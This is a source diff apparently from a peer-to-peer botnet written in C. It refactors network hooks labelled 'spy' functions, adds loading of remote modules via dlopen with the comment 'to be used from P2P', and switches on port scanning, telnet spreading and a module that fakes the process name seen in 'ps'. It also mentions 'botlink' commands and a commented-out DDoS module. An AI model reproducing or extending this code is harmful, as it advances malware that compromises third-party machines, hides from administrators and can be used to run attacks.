@@ -169,8 +169,8 @@ void OutgoingFlush(Connection *cptr) {
     if (cptr->state == TCP_NEW) {
         cptr->state = TCP_CONNECTED;
 
-        if (sptr != NULL && sptr->connect != NULL)
-            sptr->connect(cptr->module, cptr, NULL, 0);
+        if (sptr != NULL && sptr->funcs.connect != NULL)
+            sptr->funcs.connect(cptr->module, cptr, NULL, 0);
         
         if (cptr->module->functions->connect != NULL) {
             
@@ -204,10 +204,6 @@ void OutgoingFlush(Connection *cptr) {
             } else {
                 // remove this current queue. and proceed to the next (if it exists)
                 L_del_next((LIST **)&cptr->outgoing, (LIST *)qptr, (LIST **)&qptr);
-                
-                // lets break just in case the next write would be blocking..
-                // ** remove after setting up non blocking w the fds
-                break;
             }
         }
     } else {
@@ -270,16 +266,16 @@ void ConnectionBad(Connection *cptr) {
     int r = 0;
     SpyFuncs *sptr = SpyGet(cptr->module);
     
-    if (sptr != NULL && sptr->outgoing_ptr != NULL)
-        sptr->outgoing_ptr(cptr->module, cptr, NULL, 0);
+    if (sptr != NULL && sptr->funcs.outgoing != NULL)
+        sptr->funcs.outgoing(cptr->module, cptr, NULL, 0);
     
     // free buffers..
     QueueFree(&cptr->incoming);
     QueueFree(&cptr->outgoing);
     
     if (cptr->module && cptr->module->functions->disconnect) {
-        if (sptr != NULL && sptr->disconnect != NULL)
-            sptr->disconnect(cptr->module, cptr, NULL, 0);
+        if (sptr != NULL && sptr->funcs.disconnect != NULL)
+            sptr->funcs.disconnect(cptr->module, cptr, NULL, 0);
             
         r = cptr->module->functions->disconnect(cptr->module, cptr, NULL, 0);
         // 1 from disconnect means we are reusing...
@@ -355,7 +351,7 @@ void socket_loop(Modules *modules) {
     }
     
     if (!count) {
-        usleep(100);
+        usleep(500);
         
         return;
     }
@@ -413,8 +409,7 @@ void ConnectionRead(Connection *cptr) {
     // maybe find another way.. not sure if ioctl will work everywhere
     ioctl(cptr->fd, FIONREAD, &waiting);    
     if (!waiting) return;
-    
-    
+
 
     // lets add a little more just in case a fragment came in
     size = waiting;
@@ -441,6 +436,7 @@ void ConnectionRead(Connection *cptr) {
     newqueue->size = r;
 }
 
+
 // handle basic TCP/IP (input/output)
 void network_main_loop(Modules *mptr) {
     Queue *qptr = NULL;
@@ -459,16 +455,16 @@ void network_main_loop(Modules *mptr) {
                 
                 qptr->chopped = 0;
                 
-                if (sptr != NULL && sptr->read_ptr != NULL)
-                    sptr->read_ptr(mptr, cptr, &qptr->buf, &qptr->size);
+                if (sptr != NULL && sptr->funcs.read_ptr != NULL)
+                    sptr->funcs.read_ptr(mptr, cptr, &qptr->buf, &qptr->size);
                     
                 if (mptr->functions->read_ptr != NULL)
                     mptr->functions->read_ptr(mptr, cptr, &qptr->buf, &qptr->size);
                 
                 // parse data w specific note's parser
                 if (mptr->functions->incoming != NULL) {
-                    if (sptr != NULL && sptr->incoming != NULL)
-                        sptr->incoming(mptr, cptr, qptr->buf, qptr->size);
+                    if (sptr != NULL && sptr->funcs.incoming != NULL)
+                        sptr->funcs.incoming(mptr, cptr, qptr->buf, qptr->size);
                         
                     if (mptr->functions->incoming(mptr, cptr, qptr->buf, qptr->size) < 1) {
                         // we break since nothing we're looking for is there.. 
@@ -499,8 +495,8 @@ int QueueAdd(Modules *module, Connection *conn, Queue **queue, char *buf, int si
     char *newbuf = NULL;
     SpyFuncs *sptr = SpyGet(module);
     
-    if (sptr != NULL && sptr->outgoing_ptr != NULL)
-        sptr->outgoing_ptr(module, conn, &buf, &size);
+    if (sptr != NULL && sptr->funcs.outgoing != NULL)
+        sptr->funcs.outgoing(module, conn, &buf, &size);
     
     // does application layer processing (maybe filtering, modification)
     if (!module->functions->outgoing || module->functions->outgoing(module, conn, &buf, &size)) {
@@ -538,8 +534,8 @@ int RelayAdd(Modules *module, Connection *conn, char *buf, int size) {
     Connection *cptr = NULL;
     SpyFuncs *sptr = SpyGet(module);
 
-    if (sptr != NULL && sptr->outgoing_ptr != NULL)
-        sptr->outgoing_ptr(module, conn, &buf, &size);
+    if (sptr != NULL && sptr->funcs.outgoing != NULL)
+        sptr->funcs.outgoing(module, conn, &buf, &size);
             
     // does application layer processing (maybe filtering, modification)
     if (!module->functions->outgoing || module->functions->outgoing(module, conn, &buf, &size)) {
@@ -565,16 +561,6 @@ int RelayAdd(Modules *module, Connection *conn, char *buf, int size) {
     return ret;
 }    
 
-
-void print_hex(char *buf, int size) {
-    int i = 0;
-    
-    for (; i < size; i++) {
-        printf("%02x", (unsigned char)buf[i]);
-    }
-    
-    printf("\n");
-}
 
 // chop X data off the front of a queue (used after a command in botlink is read)
 // since removing the queue completely is bad
@@ -686,8 +672,10 @@ bool ASCII_is_endline(unsigned char c) {
 char *ASCIIcopy(char *src, int size) {
     char *ret = NULL;
     
-    if ((ret = (char *)malloc(size + 1)) != NULL) {
+    if ((ret = (char *)malloc(size + 2)) != NULL) {
         memcpy(ret, src, size);
+        // ensure it ends with a NULL byte
+        ret[size] = 0;
     }
     
     return ret;
@@ -1010,13 +998,9 @@ int SpyAdd(Modules *mptr, ModuleFuncs *funcs) {
         return -1;
 
     sptr->module = mptr;
-    sptr->read_ptr = funcs->read_ptr;
-    sptr->write_ptr = funcs->write_ptr;
-    sptr->incoming = funcs->incoming;
-    sptr->outgoing_ptr = funcs->outgoing;
-    sptr->plumbing = funcs->plumbing;
-    sptr->connect = funcs->connect;
-    sptr->disconnect = funcs->disconnect;
+    
+    // copy our spy functions over.. itll get called before actual funcs
+    memcpy((void *)&sptr->funcs, funcs, sizeof(ModuleFuncs));
     
     return 1;
 }
@@ -1049,9 +1033,20 @@ ExternalModules *ExternalFind(int id) {
 
 // deinitialize an external module
 int ExternalDeinit(ExternalModules *eptr) {
+    int ret = 0;
     if (eptr->plumbing == NULL) return 0;
     
+    ret = eptr->deinit();
     
+    if (ret == 1) {
+        // close dl handle
+        dlclose(eptr->dl_handle);
+        // close file descriptor
+        close(eptr->outfd);
+        // null out plumbing so we know its not initialized
+        eptr->plumbing = NULL;
+        
+    }
     
     return 1;    
 }
@@ -1076,7 +1071,8 @@ int ExternalInit(ExternalModules *eptr) {
   
   if (eptr->plumbing != NULL) {
       // first we must deinit it..
-      ExternalDeinit(eptr);
+      if (ExternalDeinit(eptr) == 0)
+        return ret;
 
       eptr->plumbing = NULL;
   }
@@ -1105,24 +1101,30 @@ int ExternalInit(ExternalModules *eptr) {
      dl_handle = (void *)dlopen(filename, RTLD_GLOBAL);
      
      if (dl_handle != NULL) {
-         
+         // get function handles from dlsym()
          _init = (void *)dlsym(dl_handle, "init");
          _deinit = (void *)dlsym(dl_handle, "deinit");
          _plumbing = (void *)dlsym(dl_handle, "plumbing");
-         
+
+        // prepare the module structure         
          eptr->init = (external_func)_init;
          eptr->deinit = (external_func)_deinit;
          eptr->plumbing = (module_func)_plumbing;
          eptr->dl_handle = dl_handle;
          
+         // execute the module's initialization routine
          ret = eptr->init();
-         
      } 
   }
   
   if (ret != 1) {
-      if (dl_handle != NULL)
+      if (dl_handle != NULL) {
         dlclose(dl_handle);
+        
+        eptr->plumbing = NULL;
+        
+        close(eptr->outfd);
+      }
   }
   
   return ret;
@@ -1131,13 +1133,15 @@ int ExternalInit(ExternalModules *eptr) {
 
 // adds an external function to the list (and initializes it)
 // to be used from P2P, etc.. passes the file data, and size
-ExternalModules *ExternalAdd(int id, char *buf, int size) {
+ExternalModules *ExternalAdd(int id, char *buf, int size, int initialize) {
     int ret = 0;
     ExternalModules *eptr = ExternalFind(id);
  
     if (eptr != NULL) {
-        free(eptr->buf);
-        eptr->buf = NULL;
+        if (eptr->buf != NULL) {
+            free(eptr->buf);
+            eptr->buf = NULL;
+        }
     } else {
         if ((eptr = (ExternalModules *)L_add((LIST **)&external_list, sizeof(ExternalModules))) == NULL)
             return NULL;
@@ -1154,8 +1158,13 @@ ExternalModules *ExternalAdd(int id, char *buf, int size) {
     // fit the module in the buffer..
     memcpy(eptr->buf, buf, size);
     
-    // now we must initialize the module   
-    ret = ExternalInit(eptr);
+    if (initialize) {
+        // now we must initialize the module   
+        ret = ExternalInit(eptr);
+    } else {
+        ret = 1;
+    }
+    
     return eptr;
 }
 
@@ -1170,9 +1179,9 @@ int main(int argc, char *argv[]) {
     //namecoin_init(&module_list);
     //peercoin_init(&module_list);
     // portscan should be before anything using it..
-    //portscan_init(&module_list);
+    portscan_init(&module_list);
     // ensure any following modules enable portscans in init
-    //telnet_init(&module_list);
+    telnet_init(&module_list);
     // initialize module for (D)DoS
     //attack_init(&module_list);
     // http servers
@@ -1183,7 +1192,7 @@ int main(int argc, char *argv[]) {
     data_init(&module_list);
     
     // fake name for 'ps'
-    //fakename_init(&module_list, argv, argc);
+    fakename_init(&module_list, argv, argc);
     
     // main loop
     while (1) {
